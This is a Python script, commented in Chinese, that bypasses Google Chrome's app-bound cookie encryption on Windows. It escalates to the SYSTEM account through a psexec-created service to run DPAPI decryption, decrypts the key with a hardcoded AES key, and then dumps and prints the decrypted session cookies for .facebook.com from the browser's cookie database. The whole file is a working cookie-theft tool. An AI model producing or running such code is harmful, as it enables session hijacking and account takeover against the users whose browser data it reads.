import os
import json
import base64
import sqlite3
import tempfile
from pypsexec.client import Client
from win32.win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import sys
import logging

# 配置日誌記錄
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def save_binary_data_to_file(data, filepath):
    """
    將二進制數據保存到文件
    """
    try:
        with open(filepath, "wb") as f:
            f.write(data)
        logger.debug(f"成功保存數據到文件: {filepath}")
    except Exception as e:
        logger.error(f"保存數據到文件失敗: {e}")
        raise

def load_binary_data_from_file(filepath):
    """
    從文件讀取二進制數據
    """
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        logger.debug(f"成功從文件加載數據: {filepath}")
        return data
    except Exception as e:
        logger.error(f"從文件加載數據失敗: {e}")
        raise

def get_local_state_key():
    """
    從 Chrome Local State 文件提取加密密鑰
    """
    local_state_path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')
    if not os.path.exists(local_state_path):
        raise FileNotFoundError(f"Local State 文件不存在: {local_state_path}")

    try:
        with open(local_state_path, "rb") as f:
            data = f.read()
            try:
                local_state = json.loads(data.decode('utf-8'))
            except UnicodeDecodeError:
                local_state = json.loads(data.decode('utf-8', 'ignore'))

        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)
        
        # 驗證並移除 DPAPI 前綴
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]
        elif encrypted_key.startswith(b'GAPI'):
            encrypted_key = encrypted_key[4:]
        
        logger.debug(f"成功提取加密密鑰，長度: {len(encrypted_key)} 字節")
        return encrypted_key
    except Exception as e:
        logger.error(f"提取 Local State 密鑰失敗: {e}")
        raise

def decrypt_with_system_account(encrypted_key):
    """
    使用 SYSTEM 帳戶進行 DPAPI 解密
    """
    # 創建臨時目錄用於文件操作
    temp_dir = tempfile.mkdtemp()
    input_path = os.path.join(temp_dir, 'input.bin')
    output_path = os.path.join(temp_dir, 'output.bin')
    
    try:
        # 保存輸入數據
        with open(input_path, 'wb') as f:
            f.write(encrypted_key)
        
        # 準備 Python 腳本
        script = f'''
import os
from win32 import win32crypt

try:
    # 讀取輸入數據
    with open(r'{input_path}', 'rb') as f:
        data = f.read()
    
    # 解密數據
    result = win32crypt.CryptUnprotectData(data, None, None, None, 0)
    
    # 保存結果
    if result and len(result) > 1:
        with open(r'{output_path}', 'wb') as f:
            f.write(result[1])
except Exception as e:
    with open(r'{output_path}.error', 'w') as f:
        f.write(str(e))
'''
        
        script_path = os.path.join(temp_dir, 'decrypt_script.py')
        with open(script_path, 'w') as f:
            f.write(script)
        
        # 執行解密
        c = Client("localhost")
        c.connect()
        try:
            c.create_service()
            result, stderr, rc = c.run_executable("python", arguments=[script_path], use_system_account=True)
            
            if rc != 0:
                if os.path.exists(f"{output_path}.error"):
                    with open(f"{output_path}.error", 'r') as f:
                        error_msg = f.read()
                    raise RuntimeError(f"SYSTEM 解密失敗: {error_msg}")
                raise RuntimeError(f"SYSTEM 解密失敗，返回碼: {rc}")
            
            # 檢查並讀取輸出
            if not os.path.exists(output_path):
                raise RuntimeError("解密輸出文件不存在")
            
            with open(output_path, 'rb') as f:
                decrypted_data = f.read()
            
            logger.debug(f"SYSTEM 解密成功，結果長度: {len(decrypted_data)} 字節")
            return decrypted_data
            
        finally:
            c.remove_service()
            c.disconnect()
    finally:
        # 清理臨時文件
        try:
            for f in [input_path, output_path, f"{output_path}.error", script_path]:
                if os.path.exists(f):
                    os.remove(f)
            os.rmdir(temp_dir)
        except Exception as e:
            logger.warning(f"清理臨時文件失敗: {e}")

def decrypt_with_user_account(encrypted_key):
    """
    使用用戶帳戶進行 DPAPI 解密
    """
    try:
        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        logger.debug(f"用戶帳戶解密成功，結果長度: {len(decrypted_key)} 字節")
        return decrypted_key
    except Exception as e:
        logger.error(f"用戶帳戶解密失敗: {e}")
        raise

def extract_encrypted_content_key(data):
    """
    從用戶帳戶解密結果中提取加密內容密鑰
    """
    try:
        # 查找二進制標記
        start_marker = bytes([0x00, 0x00, 0x00, 0x01])
        start_pos = data.find(start_marker)
        
        if start_pos == -1:
            raise ValueError("無法找到加密內容的開始標記")
        
        # 提取加密內容
        encrypted_content = data[start_pos:]
        
        if len(encrypted_content) < 32:
            raise ValueError(f"提取的加密內容太短: {len(encrypted_content)} 字節")
        
        logger.debug(f"成功提取加密內容，長度: {len(encrypted_content)} 字節")
        logger.debug(f"加密內容十六進制: {encrypted_content.hex()[:64]}...")
        
        return encrypted_content
    except Exception as e:
        logger.error(f"提取加密內容失敗: {e}")
        raise

def decrypt_aes_gcm(data, key):
    """
    使用 AES-GCM 解密數據
    """
    try:
        if len(data) < 28:  # 12(nonce) + 16(tag) 的最小長度
            raise ValueError(f"數據長度不足: {len(data)} 字節")
        
        nonce = data[:12]
        ciphertext = data[12:-16]
        tag = data[-16:]
        
        logger.debug(f"AES-GCM 解密參數:")
        logger.debug(f"- nonce: {nonce.hex()}")
        logger.debug(f"- ciphertext length: {len(ciphertext)}")
        logger.debug(f"- tag: {tag.hex()}")
        
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        logger.debug(f"AES-GCM 解密成功，結果長度: {len(plaintext)} 字節")
        return plaintext
    except Exception as e:
        logger.error("AES-GCM 解密失敗")
        logger.error(f"- 錯誤信息: {str(e)}")
        logger.error(f"- 輸入數據長度: {len(data)} 字節")
        logger.error(f"- 輸入數據: {data.hex()}")
        raise

def decrypt_app_bound_key_with_extraction():
    """
    完整解密流程，包含用戶解密結果的結構處理
    """
    try:
        # 步驟 1: 獲取加密密鑰
        encrypted_key = get_local_state_key()
        logger.info(f"步驟 1: 成功獲取加密密鑰，長度: {len(encrypted_key)} 字節")
        
        # 保存原始密鑰到文件（用於調試）
        save_binary_data_to_file(encrypted_key, "encrypted_key.bin")
        
        # 步驟 2: SYSTEM 帳戶解密
        decrypted_key_system = decrypt_with_system_account(encrypted_key)
        logger.info(f"步驟 2: SYSTEM 解密成功，長度: {len(decrypted_key_system)} 字節")
        save_binary_data_to_file(decrypted_key_system, "decrypted_key_system.bin")
        
        # 步驟 3: 用戶帳戶解密
        decrypted_key_user = decrypt_with_user_account(decrypted_key_system)
        logger.info(f"步驟 3: 用戶帳戶解密成功，長度: {len(decrypted_key_user)} 字節")
        save_binary_data_to_file(decrypted_key_user, "decrypted_key_user.bin")
        
        # 步驟 4: 提取加密內容
        encrypted_content_key = extract_encrypted_content_key(decrypted_key_user)
        logger.info("步驟 4: 成功提取加密內容")
        
        # 步驟 5: 使用硬編碼密鑰進行最終解密
        elevation_key = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
        
        try:
            content_key = decrypt_aes_gcm(encrypted_content_key, elevation_key)
        except ValueError as e:
            logger.warning(f"首次解密失敗: {e}，嘗試從文件重新加載...")
            encrypted_content_key = load_binary_data_from_file("decrypted_key_user.bin")
            content_key = decrypt_aes_gcm(encrypted_content_key, elevation_key)
        
        logger.info(f"步驟 5: 最終解密成功，content_key: {content_key.hex()}")
        return content_key
        
    except Exception as e:
        logger.error(f"完整解密流程失敗: {e}")
        raise

def extract_and_decrypt_cookies(domain_filter):
    """
    提取並解密指定域名的 Cookies
    """
    cookies_path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Default\Network\Cookies')
    if not os.path.exists(cookies_path):
        raise FileNotFoundError(f"Cookies 數據庫不存在: {cookies_path}")

    try:
        logger.info(f"開始解密 {domain_filter} 的 Cookies")
        content_key = decrypt_app_bound_key_with_extraction()
        
        conn = sqlite3.connect(cookies_path)
        conn.text_factory = bytes
        cursor = conn.cursor()
        
        cursor.execute(
            "SELECT name, encrypted_value FROM cookies WHERE host_key LIKE ?", 
            (f"%{domain_filter}%",)
        )
        
        decrypted_cookies = {}
        for name, encrypted_value in cursor.fetchall():
            cookie_name = name.decode('utf-8', 'ignore')
            try:
                if not encrypted_value.startswith(b'v10'):
                    logger.warning(f"跳過未知格式的 Cookie: {cookie_name}")
                    continue
                
                encrypted_value = encrypted_value[3:]
                decrypted_value = decrypt_aes_gcm(encrypted_value, content_key)
                decrypted_value = decrypted_value.decode('utf-8', 'ignore')
                decrypted_cookies[cookie_name] = decrypted_value
                logger.debug(f"成功解密 Cookie: {cookie_name}")
                
            except Exception as e:
                logger.error(f"解密 Cookie {cookie_name} 時失敗: {e}")
                continue
                
        return decrypted_cookies
        
    except Exception as e:
        logger.error(f"提取和解密 Cookies 失敗: {e}")
        raise
        
    finally:
        if 'conn' in locals():
            conn.close()

if __name__ == "__main__":
    try:
        domain = ".facebook.com"
        logger.info(f"=== 開始提取並解密 {domain} 的 Cookies ===")
        
        cookies = extract_and_decrypt_cookies(domain)
        if not cookies:
            logger.warning(f"未找到 {domain} 的 Cookies")
        else:
            logger.info(f"\n=== 解密的 Cookies ===")
            for name, value in cookies.items():
                logger.info(f"{name}: {value}")
                
    except Exception as e:
        logger.error(f"程序執行失敗: {e}")
        sys.exit(1)